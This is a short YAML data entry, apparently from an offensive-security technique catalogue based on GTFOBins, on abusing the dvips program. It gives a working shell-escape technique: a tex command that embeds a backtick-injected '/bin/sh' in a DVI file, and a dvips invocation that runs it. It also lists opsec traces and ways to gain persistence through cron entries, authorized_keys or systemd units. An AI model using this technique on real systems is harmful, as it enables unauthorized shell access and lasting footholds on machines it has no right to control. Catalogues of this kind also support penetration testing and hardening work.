---
name: dvips
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: dvips -R0 texput.dvi
  notes: |-
    The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

    ```
    tex '\special{psfile="`/bin/sh 1>&0"}\end'
    ```
references:
- https://gtfobins.github.io/gtfobins/dvips/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
